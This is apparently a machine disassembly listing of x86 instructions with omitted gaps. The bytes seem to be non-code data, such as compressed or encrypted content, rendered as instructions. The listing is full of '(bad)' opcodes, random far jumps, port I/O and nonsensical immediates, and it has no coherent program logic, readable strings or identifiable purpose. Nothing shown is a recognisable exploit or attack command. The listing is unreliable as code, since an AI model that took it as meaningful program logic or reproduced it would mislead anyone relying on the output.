  42b6d8:	cmp    DWORD PTR [edx-0x6de80217],eax
  42b6de:	aas    
  42b6df:	mov    DWORD PTR ds:0xa68c9d66,0x7b54d71a
  42b6e9:	mov    eax,ds:0x4832f860
  42b6ee:	cmp    eax,0x269ce216
  42b6f3:	xchg   esp,eax
  42b6f4:	dec    ecx
  42b6f5:	pop    ds
  42b6f6:	scas   eax,DWORD PTR es:[edi]
  42b6f7:	(bad)  
  42b6f8:	lds    edx,FWORD PTR [edi-0x26fc9e45]
  42b6fe:	dec    eax
  42b6ff:	(bad)  
  42b700:	rol    ebp,1
  42b702:	push   esp
  42b703:	pop    edi
  42b704:	dec    edx
  42b705:	xchg   edx,eax
  42b706:	fidivr WORD PTR [ecx-0x13]
  42b709:	rcr    ebx,1
  42b70b:	cs cli 
  42b70d:	jl     0x42b758
  42b70f:	inc    ebp
	...
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	sbb    BYTE PTR [eax-0x2f37c215],dl
  42b786:	add    DWORD PTR [eax],eax
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	xchg   ebp,eax
  42b78d:	xchg   edx,eax
  42b78e:	xchg   ecx,eax
  42b78f:	fidiv  DWORD PTR [eax+ebp*1-0x1b]
  42b793:	xor    al,0x57
  42b795:	test   BYTE PTR [ebx+edx*8-0x5fd43970],cl
  42b79c:	shr    ebp,cl
  42b79e:	push   esi
  42b79f:	ins    DWORD PTR es:[edi],dx
  42b7a0:	mov    ecx,0x67cff651
  42b7a5:	push   ds
  42b7a6:	adc    DWORD PTR [edi-0x5a3909ce],ecx
  42b7ac:	mov    edx,0xa1b1263d
  42b7b1:	mov    esi,DWORD PTR [ebp+edx*8-0x7f]
  42b7b5:	inc    DWORD PTR [esi+0x77]
  42b7b8:	inc    ebp
  42b7b9:	sub    cl,0x75
  42b7bc:	push   0x4c
  42b7be:	ret    
  42b7bf:	nop
  42b7c0:	aad    0x9e
  42b7c2:	jmp    0x42b7cd
  42b7c4:	fsub   QWORD PTR [ecx+0x3b27a4fd]
  42b7ca:	sub    edi,DWORD PTR [ecx+edi*1]
  42b7cd:	out    0xa7,eax
  42b7cf:	sub    dh,BYTE PTR [edx-0x7]
  42b7d2:	adc    edx,DWORD PTR [ebx+0x3db4b7ba]
  42b7d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7d9:	out    dx,al
  42b7da:	cwde   
  42b7db:	comiss xmm7,DWORD PTR [edi-0x73063f80]
  42b7e2:	mov    ds:0xb313ec8e,al
  42b7e7:	lods   al,BYTE PTR ds:[esi]
  42b7e8:	int    0xe9
  42b7ea:	(bad)  
  42b7ed:	mov    ah,0xda
  42b7ef:	cmp    BYTE PTR ds:[ebp-0x5c],0x39
  42b7f4:	cmp    BYTE PTR [edx+0x57],0xf0
  42b7f8:	fs jae 0x42b7cf
  42b7fb:	loop   0x42b825
  42b7fd:	dec    edx
  42b7fe:	jnp    0x42b79c
  42b800:	shr    eax,cl
  42b802:	addr16 sub al,0x34
  42b805:	or     al,0x16
  42b807:	fnstsw WORD PTR [edx]
  42b809:	dec    esi
  42b80a:	inc    ecx
  42b80b:	js     0x42b809
  42b80d:	jae    0x42b7e8
  42b80f:	mov    al,0xc9
  42b811:	or     DWORD PTR [eax],edx
  42b813:	sbb    al,0x8e
  42b815:	adc    BYTE PTR [edi+0x320e962a],cl
  42b81b:	mov    esi,0xa6136c14
  42b820:	jnp    0x42b887
  42b822:	or     ebp,ebp
  42b824:	sbb    eax,0x568b0ffc
  42b829:	push   edx
  42b82a:	jmp    0x42b87d
  42b82c:	shl    BYTE PTR [edx],cl
  42b82e:	nop
  42b82f:	(bad)
  42b833:	xor    DWORD PTR [ebx-0x8],edi
  42b836:	sub    DWORD PTR [edx],ebp
  42b838:	rcl    bh,1
  42b83a:	xlat   BYTE PTR ds:[ebx]
  42b83b:	pushf  
  42b83c:	push   ecx
  42b83d:	dec    esi
  42b83e:	sbb    cl,ch
  42b840:	pop    es
  42b841:	inc    edi
  42b842:	pop    ss
  42b843:	mov    al,ds:0x2931ae06
  42b848:	retf   0xf1fe
  42b84b:	push   ebx
  42b84c:	sahf   
  42b84d:	dec    esp
  42b84e:	test   al,0xc0
  42b850:	or     al,0x8f
  42b852:	pop    esp
  42b853:	push   ebx
  42b854:	pop    ebp
  42b855:	cmp    eax,0xc01aacfe
  42b85a:	pusha  
  42b85b:	fimul  DWORD PTR [ecx+0x18aab2fa]
  42b861:	inc    esp
  42b862:	in     eax,0x9a
  42b864:	jnp    0x42b898
  42b866:	(bad)  
  42b867:	xchg   ebx,eax
  42b868:	imul   edx,DWORD PTR [ecx-0x1d],0xffffffe3
  42b86c:	cmp    edi,DWORD PTR [ebp-0x762e7e84]
  42b872:	mov    edi,0xdc8bcbe1
  42b877:	and    ebp,DWORD PTR [ecx+0x5c]
  42b87a:	int3   
  42b87b:	and    al,ch
  42b87d:	jnp    0x42b81d
  42b87f:	jmp    0x40bd:0xb9a16271
  42b886:	(bad)  ds:0x57c0fc6b
  42b88c:	fs ins DWORD PTR es:[edi],dx
  42b88e:	jns    0x42b83e
	...
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esi,DWORD PTR [edx]
  42b901:	cmp    DWORD PTR [ecx+ebx*4],ebx
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	push   cs
  42b90d:	add    al,0x82
  42b90f:	push   es
  42b910:	mov    cl,0xea
  42b912:	sub    al,0xac
  42b914:	std    
  42b915:	cmp    eax,0x41429ab8
  42b91a:	adc    esi,0x8b4ba219
  42b920:	retf   
  42b921:	push   ecx
  42b922:	fiadd  WORD PTR [edi-0x407b1005]
  42b928:	jnp    0x42b96b
  42b92a:	(bad)  
  42b92c:	add    dh,BYTE PTR [ebx+0x748d264a]
  42b932:	push   esi
  42b933:	jge    0x42b8ec
  42b935:	les    esp,FWORD PTR [eax+0x4a94a25a]
  42b93b:	jno    0x42b987
  42b93d:	push   cs
  42b93e:	sbb    DWORD PTR [eax],eax
  42b940:	xchg   esi,eax
  42b941:	pop    esp
  42b942:	leave  
  42b943:	fnstcw WORD PTR [ecx+0x71]
  42b946:	pop    ebp
  42b947:	sub    eax,0xbed3ee57
  42b94c:	das    
  42b94d:	inc    ecx
  42b94e:	mov    eax,0xb31a551a
  42b953:	and    esi,DWORD PTR [esi+0x2bfcbf2d]
  42b959:	mov    ebx,0x6e095f39
  42b95e:	inc    ebp
  42b95f:	cmp    al,BYTE PTR [edx+0x62]
  42b962:	push   ebp
  42b963:	ja     0x42b98f
  42b965:	out    0x37,al
  42b967:	push   esp
  42b968:	nop
  42b969:	pop    edi
  42b96a:	jnp    0x42b9ba
  42b96c:	popa   
  42b96d:	shl    esi,0x7b
  42b970:	lods   al,BYTE PTR ds:[esi]
  42b971:	cs jae 0x42b8fb
  42b974:	dec    eax
  42b975:	jmp    0x42b94d
  42b977:	mov    dh,0x67
  42b979:	ds push edi
  42b97b:	push   ebp
  42b97c:	and    eax,0x83f7fc8d
  42b981:	xchg   BYTE PTR [ecx],bh
  42b983:	sub    eax,0x953f80cb
  42b988:	data16 ins BYTE PTR es:[edi],dx
  42b98a:	cdq    
  42b98b:	xor    eax,0xa9d22c79
  42b990:	scas   eax,DWORD PTR es:[edi]
  42b991:	xor    BYTE PTR [edx],dh
  42b993:	mov    eax,ds:0xbc74c9b2
  42b998:	cmp    BYTE PTR [edx+eiz*8-0x642e54bd],dl
  42b99f:	adc    eax,0xcc82618a
  42b9a4:	inc    edx
  42b9a5:	and    edx,DWORD PTR [eax]
  42b9a7:	xchg   DWORD PTR [edx],esi
  42b9a9:	mov    WORD PTR [ecx-0xf],?
  42b9ac:	jo     0x42b933
  42b9ae:	pop    eax
  42b9af:	or     BYTE PTR [esi],cl
  42b9b1:	and    DWORD PTR [edi+0x55],ebx
  42b9b4:	mov    bl,0x30
  42b9b6:	adc    ch,dl
  42b9b8:	xor    eax,0x43f43014
  42b9bd:	sti    
  42b9be:	out    0x98,al
  42b9c0:	shl    BYTE PTR fs:[ebx-0x17],cl
  42b9c4:	stos   BYTE PTR es:[edi],al
  42b9c5:	mov    ch,0x4b
  42b9c7:	xchg   edi,eax
  42b9c8:	mov    ds:0x84382b58,eax
  42b9cd:	es adc eax,0x5449e229
  42b9d3:	jmp    DWORD PTR [ecx+eax*4-0x4ee68aec]
  42b9da:	push   ebx
  42b9db:	rol    BYTE PTR [ebx+edi*8-0x58],1
  42b9df:	in     al,0xd
  42b9e1:	xchg   esi,eax
  42b9e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9e3:	jno    0x42ba02
  42b9e5:	int    0x9d
  42b9e7:	jp     0x42b9d6
  42b9e9:	(bad)  
  42b9ea:	jae    0x42b975
  42b9ec:	xchg   edi,eax
  42b9ed:	dec    ebx
  42b9ee:	pop    ebx
  42b9ef:	mov    DWORD PTR [esi-0x55],ebx
  42b9f2:	add    BYTE PTR [ebp-0x6705678a],al
  42b9f8:	rcr    BYTE PTR [eax],1
  42b9fa:	fldenv [edi]
  42b9fc:	lahf   
  42b9fd:	out    0x1b,al
  42b9ff:	mov    ah,BYTE PTR [edx+0xf]
  42ba02:	in     al,dx
  42ba03:	or     BYTE PTR [eax-0x51],ch
  42ba06:	xchg   BYTE PTR [eax+0x35],ah
  42ba09:	add    eax,0xd8287ed
  42ba0e:	dec    esi
  42ba0f:	dec    ebp
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ebx],ebp
  42ba81:	inc    edx
  42ba82:	mov    ecx,0x1d2d0dc
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	daa    
  42ba8d:	jle    0x42ba13
  42ba8f:	test   eax,0x94525bc2
  42ba94:	setg   BYTE PTR [eax]
  42ba97:	cli    
  42ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba99:	mov    ds:0x455c52f1,eax
  42ba9e:	xor    esi,DWORD PTR [eax-0x63c98700]
  42baa4:	leave  
  42baa5:	in     eax,0x36
  42baa7:	xor    ebp,esi
  42baa9:	and    edi,DWORD PTR [esi-0x3f2b98c3]
  42baaf:	scas   eax,DWORD PTR es:[edi]
  42bab0:	sbb    al,0xe6
  42bab2:	cld    
  42bab3:	sbb    esp,DWORD PTR [ecx-0x76b004ac]
  42bab9:	pop    eax
  42baba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42babb:	adc    BYTE PTR [ebp+0x3d],0x96
  42babf:	lods   al,BYTE PTR ds:[esi]
  42bac0:	inc    ebp
  42bac1:	mov    ah,0x18
  42bac3:	test   eax,0x1b9e951c
  42bac8:	jg     0x42bb41
  42baca:	imul   ebx,DWORD PTR [edx-0x16],0xe059addb
  42bad1:	imul   esp,DWORD PTR [esi+0x5bc0f90c],0x4d
  42bad8:	loop   0x42baed
  42bada:	mov    BYTE PTR [ebp+0x7f5d2c9c],0x8
  42bae1:	or     al,0x1e
  42bae3:	adc    bl,BYTE PTR [ebx+0x42]
  42bae6:	bnd jg 0x42bb18
  42bae9:	inc    esi
  42baea:	outs   dx,DWORD PTR ds:[esi]
  42baeb:	push   esi
  42baec:	sar    BYTE PTR [ebp+0x40],1
  42baef:	mov    ecx,edi
  42baf1:	adc    BYTE PTR [esi-0x2cd8ed52],ah
  42baf7:	cli    
  42baf8:	pop    ecx
  42baf9:	ins    BYTE PTR es:[edi],dx
  42bafa:	sti    
  42bafb:	push   eax
  42bafc:	shl    BYTE PTR [eax-0x51dbe195],0x3b
  42bb03:	fisttp DWORD PTR [edi]
  42bb05:	push   ss
  42bb06:	xchg   BYTE PTR [esp+ecx*8],dh
  42bb09:	mov    ebx,0xc0b735f6
  42bb0e:	ret    0x5b49
  42bb11:	(bad)  
  42bb12:	xor    esp,DWORD PTR [esi+0x781a16c8]
  42bb18:	lods   eax,DWORD PTR ds:[esi]
  42bb19:	stc    
  42bb1a:	mov    ecx,0x353f4779
  42bb1f:	and    al,0x9
  42bb21:	retf   0xca9f
  42bb24:	adc    DWORD PTR [esi+0x7b],0x42bc3752
  42bb2b:	(bad)  
  42bb2c:	push   edx
  42bb2d:	mov    DWORD PTR [edi],ebp
  42bb2f:	daa    
  42bb30:	mov    dh,0x30
  42bb32:	add    DWORD PTR [ebp+0x4e4bb745],eax
  42bb38:	dec    esp
  42bb39:	(bad)
  42bb3c:	jmp    0x42bb5f
  42bb3e:	sbb    bl,dh
  42bb40:	dec    esi
  42bb41:	xchg   esp,eax
  42bb42:	ss (bad) 
  42bb45:	inc    esi
  42bb46:	adc    al,0xef
  42bb48:	imul   ebp,DWORD PTR [eax+0x5b93cfff],0xfa18669
  42bb52:	and    al,0xe8
  42bb54:	cli    
  42bb55:	outs   dx,DWORD PTR ds:[esi]
  42bb56:	adc    dl,ah
  42bb58:	aaa    
  42bb59:	mov    ch,0x40
  42bb5b:	(bad)  
  42bb5c:	jecxz  0x42bb43
  42bb5e:	add    ebp,DWORD PTR [ebx]
  42bb60:	push   edi
  42bb61:	push   ebx
  42bb62:	mov    esp,0xe723be79
  42bb67:	and    eax,0x6108477e
  42bb6c:	mov    esp,0xaa83b03e
  42bb71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb72:	mov    edx,0xbb3c3276
  42bb77:	xchg   esi,eax
  42bb78:	(bad)  
  42bb79:	push   ebp
  42bb7a:	adc    DWORD PTR [edi],ecx
  42bb7c:	inc    ecx
  42bb7d:	pop    ebx
  42bb7e:	sbb    edi,DWORD PTR [ecx+0x6]
  42bb81:	push   es
  42bb82:	add    eax,0xd9d2f73e
  42bb87:	lods   al,BYTE PTR ds:[esi]
  42bb88:	dec    esp
  42bb89:	ror    BYTE PTR [edi-0x56],cl
  42bb8c:	add    eax,edx
  42bb8e:	add    DWORD PTR [edi+0x0],ebp
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	fs push eax
  42bc02:	ret    
  42bc03:	fcmovbe st,st(4)
  42bc05:	rol    DWORD PTR [ecx],cl
  42bc07:	add    BYTE PTR [ecx+eax*1],al
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	sbb    ch,BYTE PTR [ebp+0x64174083]
  42bc12:	popa   
  42bc13:	out    0xcb,al
  42bc15:	scas   al,BYTE PTR es:[edi]
  42bc16:	mov    bh,0xf2
  42bc18:	push   eax
  42bc19:	out    dx,al
  42bc1a:	push   ebp
  42bc1b:	lock neg DWORD PTR [esi]
  42bc1e:	cwde   
  42bc1f:	dec    ebp
  42bc20:	shl    DWORD PTR [ebx+edi*8-0xfa3d730],cl
  42bc27:	and    eax,0x5e96ec70
  42bc2c:	test   BYTE PTR [ecx+0x27edb085],ah
  42bc32:	aad    0x22
  42bc34:	add    BYTE PTR [edi],ch
  42bc36:	mov    ecx,ecx
  42bc38:	mov    edx,0xf18caf4
  42bc3d:	das    
  42bc3e:	outs   dx,DWORD PTR ds:[esi]
  42bc3f:	sbb    eax,DWORD PTR [edi]
  42bc41:	mov    edx,0x80a188b0
  42bc46:	stos   BYTE PTR es:[edi],al
  42bc47:	jbe    0x42bc4d
  42bc49:	sub    DWORD PTR [ebp+0x20],ecx
  42bc4c:	shl    DWORD PTR [edi],cl
  42bc4e:	ror    BYTE PTR [eax],cl
  42bc50:	xor    BYTE PTR [edx],0xac
  42bc53:	ja     0x42bcb3
  42bc55:	fist   WORD PTR ss:[ebx*4+0xce7de34]
  42bc5d:	addr16 jbe 0x42bc5d
  42bc60:	scas   eax,DWORD PTR es:[edi]
  42bc61:	loopne 0x42bc1a
  42bc63:	ins    DWORD PTR es:[edi],dx
  42bc64:	push   es
  42bc65:	loope  0x42bcbd
  42bc67:	out    0xc1,eax
  42bc69:	shl    esp,1
  42bc6b:	push   ebx
  42bc6c:	xor    ecx,ecx
  42bc6e:	ror    BYTE PTR [ebx-0x229909fe],cl
  42bc74:	jnp    0x42bcb2
  42bc76:	pop    esi
  42bc77:	dec    esp
  42bc78:	inc    edi
  42bc79:	nop
  42bc7a:	or     al,0xbb
  42bc7c:	jnp    0x42bcb0
  42bc7e:	inc    edx
  42bc7f:	push   0x1a98aacc
  42bc84:	add    BYTE PTR [eax+0x60ab1d6c],0x19
  42bc8b:	ffree  st(1)
  42bc8d:	jo     0x42bc76
  42bc8f:	pop    ds
  42bc90:	or     al,0xae
  42bc92:	js     0x42bc65
  42bc94:	daa    
  42bc95:	aad    0xb4
  42bc97:	fdiv   DWORD PTR [edx]
  42bc99:	daa    
  42bc9a:	add    al,0x8b
  42bc9c:	push   esp
  42bc9d:	and    al,0x36
  42bc9f:	jl     0x42bd05
  42bca1:	push   0x31
  42bca3:	jl     0x42bc44
  42bca5:	mov    dh,0x51
  42bca7:	jno    0x42bc31
  42bca9:	xchg   edi,eax
  42bcaa:	test   BYTE PTR [edi+0x6e],dh
  42bcad:	icebp  
  42bcae:	and    BYTE PTR ds:0xf8d56eb,ch
  42bcb4:	and    al,0x72
  42bcb6:	(bad)  
  42bcb7:	xor    eax,ebp
  42bcb9:	xchg   edi,eax
  42bcba:	mov    edi,0x43b8757
  42bcbf:	and    al,0x16
  42bcc1:	cs mov dl,0xd1
  42bcc4:	adc    al,0x94
  42bcc6:	rcr    DWORD PTR [edi],cl
  42bcc8:	pop    es
  42bcc9:	and    DWORD PTR [ecx],edx
  42bccb:	pop    edx
  42bccc:	test   eax,0x7e3d8bce
  42bcd1:	cmp    DWORD PTR [ebx+0x53],esp
  42bcd4:	ins    DWORD PTR es:[edi],dx
  42bcd5:	fmul   DWORD PTR [esi+0x4c]
  42bcd8:	push   0xffffffd7
  42bcda:	adc    al,0xf7
  42bcdc:	pop    eax
  42bcdd:	cmp    eax,0xa31ba3c3
  42bce2:	jecxz  0x42bd4e
  42bce4:	or     DWORD PTR [ecx],ebp
  42bce6:	repz aam 0xee
  42bce9:	sub    BYTE PTR [ecx],dl
  42bceb:	sbb    esi,eax
  42bced:	pusha  
  42bcee:	aad    0x84
  42bcf0:	inc    ebp
  42bcf1:	mov    dl,bl
  42bcf3:	stc    
  42bcf4:	and    BYTE PTR [eax+ebp*4+0x5a9417c8],bl
  42bcfb:	xchg   ecx,eax
  42bcfc:	sbb    DWORD PTR [ebx+0x788aad8a],ebx
  42bd02:	jno    0x42bc95
  42bd04:	dec    edx
  42bd05:	mov    bl,0x7b
  42bd07:	mov    ebx,0xa5c43b74
  42bd0c:	inc    ebx
  42bd0d:	jnp    0x42bd5e
  42bd0f:	lahf   
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd73
  42bd81:	jne    0x42bdac
  42bd83:	xor    bl,al
  42bd85:	aam    0x1
  42bd87:	add    BYTE PTR [ecx+eax*1],al
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	lds    edi,FWORD PTR [eax+0x235547d]
  42bd92:	fimul  DWORD PTR [edi-0x6e75f685]
  42bd98:	ss nop
  42bd9a:	push   esp
  42bd9b:	inc    eax
  42bd9c:	fwait
  42bd9d:	lods   al,BYTE PTR ds:[esi]
  42bd9e:	(bad)  
  42bda0:	xchg   edx,eax
  42bda1:	cdq    
  42bda2:	mov    al,0xba
  42bda4:	fdivp  st(1),st
  42bda6:	push   ecx
  42bda7:	hlt    
  42bda8:	test   BYTE PTR [edx-0x59],bl
  42bdab:	xchg   ecx,eax
  42bdac:	sub    eax,edi
  42bdae:	jmp    0x42bd38
  42bdb0:	bsr    edi,DWORD PTR [edi]
  42bdb3:	sbb    BYTE PTR [ebx+eax*8],ch
  42bdb6:	hlt    
  42bdb7:	xlat   BYTE PTR ds:[ebx]
  42bdb8:	scas   eax,DWORD PTR es:[edi]
  42bdb9:	xor    DWORD PTR [ecx+0x6fcb8b2a],0xffffffbd
  42bdc0:	inc    ebp
  42bdc1:	mov    ds:0xa1c1d09a,al
  42bdc6:	sub    al,0x56
  42bdc8:	das    
  42bdc9:	pop    es
  42bdca:	cwde   
  42bdcb:	push   0xffffffd8
  42bdcd:	xchg   ecx,ebx
  42bdcf:	sbb    BYTE PTR es:[ecx-0x3fd9fd30],dh
  42bdd6:	(bad)  
  42bdd7:	js     0x42bdd9
  42bdd9:	daa    
  42bdda:	cs scas eax,DWORD PTR es:[edi]
  42bddc:	in     eax,0x24
  42bdde:	mov    cl,0x4e
  42bde0:	pop    es
  42bde1:	shl    DWORD PTR [ebp+0x53],cl
  42bde4:	fild   DWORD PTR [ebp+0x3653165b]
  42bdea:	mov    ch,0xc7
  42bdec:	les    ecx,FWORD PTR [edi-0x5f]
  42bdef:	cmp    DWORD PTR [ecx],0x18
  42bdf2:	jle    0x42bddf
  42bdf4:	adc    BYTE PTR [edi+0x28012abf],al
  42bdfa:	pop    eax
  42bdfb:	inc    edx
  42bdfc:	adc    esp,edx
  42bdfe:	das    
  42bdff:	repz idiv BYTE PTR [ebx]
  42be02:	sbb    eax,0xa8fa16e6
  42be07:	or     BYTE PTR [edi],dh
  42be09:	fsub   QWORD PTR ds:0xbc2f8234
  42be0f:	inc    ebp
  42be10:	jae    0x42be8d
  42be12:	mov    ds:0xe9ca5c2a,al
  42be17:	(bad)  
  42be18:	daa    
  42be19:	mov    dh,0xa8
  42be1b:	test   eax,0xdd3561c5
  42be20:	daa    
  42be21:	shl    DWORD PTR ds:0xd701a680,cl
  42be27:	cdq    
  42be28:	dec    ebp
  42be29:	hlt    
  42be2a:	hlt    
  42be2b:	add    esp,ebx
  42be2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be2e:	icebp  
  42be2f:	fadd   DWORD PTR [ebp+esi*8-0x3b]
  42be33:	push   es
  42be34:	(bad)  
  42be35:	and    DWORD PTR [ebx],edi
  42be37:	ins    BYTE PTR es:[edi],dx
  42be38:	add    al,0xf9
  42be3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be3b:	loop   0x42bdcd
  42be3d:	test   DWORD PTR [ebx+0x2a4492dc],ebp
  42be43:	jge    0x42be1e
  42be45:	aam    0x6c
  42be47:	repnz lea edx,[edi]
  42be4a:	xchg   ebp,eax
  42be4b:	std    
  42be4c:	aaa    
  42be4d:	mov    eax,0xe31ab4e2
  42be52:	sub    ebp,esp
  42be54:	out    0xbe,al
  42be56:	into   
  42be57:	dec    ebx
  42be58:	adc    al,0xb5
  42be5a:	push   eax
  42be5b:	cmp    esp,DWORD PTR [ebx]
  42be5d:	mov    al,ds:0x39163bc7
  42be62:	cmp    DWORD PTR [edi+0x1e],edi
  42be65:	and    ebx,esp
  42be67:	aaa    
  42be68:	cmp    eax,0xcc5b456c
  42be6d:	jnp    0x42be85
  42be6f:	add    DWORD PTR [ebx],ecx
  42be71:	mov    bh,0x90
  42be73:	ins    DWORD PTR es:[edi],dx
  42be74:	sub    DWORD PTR [ecx-0xb6907c0],ecx
  42be7a:	popa   
  42be7b:	jle    0x42be5e
  42be7d:	out    dx,eax
  42be7e:	rol    DWORD PTR [edi+0x12],0x88
  42be82:	retf   0xa15
  42be85:	fidiv  DWORD PTR [edi+0x781a1af8]
  42be8b:	and    eax,0x47727409
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x627bd7c8,eax
  42bf01:	gs cmp eax,0x1d5dc83
  42bf07:	add    BYTE PTR [ecx+eax*1],al
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	jmp    0xf87c:0xdd2f38ce
  42bf13:	jmp    0xa51d:0x5707ce57
  42bf1a:	cmp    ecx,DWORD PTR [ecx+0x1a17d7e1]
  42bf20:	jmp    0xcac7:0xd6c35e70
  42bf27:	scas   al,BYTE PTR es:[edi]
  42bf28:	sbb    BYTE PTR [ecx+0x526022c9],ah
  42bf2e:	fidiv  DWORD PTR [esi+edx*1]
  42bf31:	mov    ch,0x1b
  42bf33:	push   edx
  42bf34:	rol    DWORD PTR [edi],1
  42bf36:	test   al,0x85
  42bf38:	mov    al,ds:0x5d8be9d4
  42bf3d:	shr    BYTE PTR [edi],1
  42bf3f:	retf   
  42bf40:	and    al,0x69
  42bf42:	sbb    al,0xaf
  42bf44:	mov    esp,0x3276fe4a
  42bf49:	push   0xb
  42bf4b:	jle    0x42bf08
  42bf4d:	in     eax,dx
  42bf4e:	adc    BYTE PTR ds:0x26988fa4,0xe5
  42bf55:	out    0x24,eax
  42bf57:	fld    TBYTE PTR [ecx]
  42bf59:	mov    dh,0x9e
  42bf5b:	inc    esp
  42bf5c:	jg     0x42bf72
  42bf5e:	mov    ds:0x79501ddf,al
  42bf63:	imul   ecx,DWORD PTR [esi-0x18d712bd],0x75
  42bf6a:	js     0x42befc
  42bf6c:	lea    esi,[edi-0x53a0bbad]
  42bf72:	cli    
  42bf73:	pop    ebp
  42bf74:	dec    esp
  42bf75:	or     eax,0x87632e9
  42bf7a:	fsubr  DWORD PTR [edx+0x76]
  42bf7d:	cmp    BYTE PTR [edx+0x6d],bh
  42bf80:	xor    DWORD PTR [ecx+0x3c0976f7],edx
  42bf86:	in     eax,0xfb
  42bf88:	add    eax,0xa212be7c
  42bf8d:	stos   BYTE PTR es:[edi],al
  42bf8e:	sbb    ecx,ebp
  42bf90:	mov    ah,0x1c
  42bf92:	loope  0x42bfe6
  42bf94:	test   eax,0xf6d09cfe
  42bf99:	pop    es
  42bf9a:	xadd   DWORD PTR [edx+0x38ab5a8],eax
  42bfa1:	and    DWORD PTR [esi],0x9d183d32
  42bfa7:	adc    al,0xdd
  42bfa9:	push   esp
  42bfaa:	cmp    eax,DWORD PTR [ebx+0x66]
  42bfad:	inc    ebp
  42bfae:	ins    BYTE PTR es:[edi],dx
  42bfaf:	cmp    al,0x5c
  42bfb1:	xchg   esp,eax
  42bfb2:	fwait
  42bfb3:	push   ds
  42bfb4:	ret    
  42bfb5:	dec    ebx
  42bfb6:	mov    al,0xee
  42bfb8:	push   esp
  42bfb9:	sbb    eax,eax
  42bfbb:	inc    edx
  42bfbc:	cs (bad) 
  42bfbe:	ret    0x171e
  42bfc1:	out    dx,eax
  42bfc2:	sahf   
  42bfc3:	mov    es,WORD PTR [ebx-0x17]
  42bfc6:	(bad)  
  42bfc7:	mov    BYTE PTR [eax],bl
  42bfc9:	sar    DWORD PTR [ebx+0x207511d4],cl
  42bfcf:	lods   eax,DWORD PTR ds:[esi]
  42bfd0:	sahf   
  42bfd1:	adc    dl,al
  42bfd3:	jp     0x42c048
  42bfd5:	push   cs
  42bfd6:	add    BYTE PTR [ecx-0x15],al
  42bfd9:	mov    bl,0x88
  42bfdb:	stos   DWORD PTR es:[edi],eax
  42bfdc:	aas    
  42bfdd:	inc    ecx
  42bfde:	lds    edx,FWORD PTR [eax]
  42bfe0:	shr    BYTE PTR [ebx+esi*1+0x27eed2c8],1
  42bfe7:	adc    DWORD PTR [ecx+0x2051434c],edi
  42bfed:	jp     0x42bfc3
  42bfef:	mov    al,ds:0xd386ec13
  42bff4:	or     bh,cl
  42bff6:	and    esi,esp
  42bff8:	mov    al,ds:0xdc23621a
  42bffd:	add    al,0x2f
  42bfff:	call   0x2aaa:0xc9b20283
  42c006:	inc    esi
  42c007:	rcl    DWORD PTR [esi+0x4daf12c5],1
  42c00d:	mov    ds:0xced5,al
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	sbb    bh,BYTE PTR [ebp+0x69]
  42c083:	iret   
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	xlat   BYTE PTR ds:[ebx]
  42c08d:	mov    bl,BYTE PTR [ebx+0x59e5d565]
  42c093:	dec    ecx
  42c094:	pop    DWORD PTR [ebx]
  42c096:	dec    eax
  42c097:	loope  0x42c115
  42c099:	mov    ds:0x22ac829b,al
  42c09e:	icebp  
  42c09f:	int3   
  42c0a0:	int3   
  42c0a1:	pop    esp
  42c0a2:	pop    ebx
  42c0a3:	mov    bl,0x3d
  42c0a5:	push   esp
  42c0a6:	sub    cl,al
  42c0a8:	push   cs
  42c0a9:	sbb    edi,DWORD PTR [ebx-0x3c5472a]
  42c0af:	mov    WORD PTR [edx+0x38f2c2ea],gs
  42c0b5:	push   ss
  42c0b6:	sub    edx,DWORD PTR [edx]
  42c0b8:	sbb    BYTE PTR [esi],dh
  42c0ba:	jae    0x42c092
  42c0bc:	xchg   DWORD PTR [edi+0x23],ebx
  42c0bf:	sahf   
  42c0c0:	pop    ebx
  42c0c1:	out    dx,al
  42c0c2:	es aam 0x54
